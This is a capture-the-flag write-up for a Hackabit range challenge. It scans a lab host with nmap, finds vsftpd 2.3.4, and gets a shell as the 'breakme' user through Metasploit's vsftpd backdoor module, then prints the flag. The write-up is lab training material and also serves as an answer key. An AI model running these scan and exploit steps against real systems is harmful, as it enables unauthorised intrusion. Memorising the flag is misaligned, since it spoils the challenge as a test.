## Challenge ~
If you did the more advanced challenges during the qualifier this should already be familiar. Your goal here is to compromise the `10.128.0.5` machine and get access as the `breakme` user.

Remember that there may be non-vulnerable services on the machine. Recon is the #1 priority. Keep this shell open once you have it, you'll need it for `Left Face`.
<br>

`range.final.hackabit.com`

<br>

<div align="center">
  <b>IMPORTANT -- CHALLENGES IN RANGE WILL BE LESS DESCRIPTIVE SINCE THE MACHINES HOSTING THE CHALLENGES ARE DOWN</b>
</div>
    
<br>
<br>
    
## Solution ~
First things first, lets run `bash` on the server to get a better hud of our terminal turning this:

```
-$
```

Into this:

```
[username]@[ip]-$
```

This gives us a little bit more control over our terminal. Alright, onto business, first we'll use `nmap -p- 10.128.0.5` to get any available ports. We find two at `ports 21 & 22`. Doing a further scan to discover any vulnerabilities on these ports we run `nmap -p 21,22 -script=vuln 10.128.0.5` and get a vulnerability for port 21 running `vsftpd 2.3.4` with the description saying that we can run a <a href="https://en.wikipedia.org/wiki/Backdoor_(computing)">backdoor</a> on it.

<br>

I used <a href="https://www.metasploit.com/">Metasploit</a> to create this backdoor on the connection:

```
[username]@[ip]-$ msfconsole

- Cool Icon -

## Go to vsftpd backdoor
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

## Set our target
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 10.128.0.5

## FIRE!
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

After running this, we gain access to the `breakme` user and we are able to get the flag that's in the home directory of the user.
<br>
`cat flag.txt -> flag{remember_this_one?_pays_to_be_a_winner}`
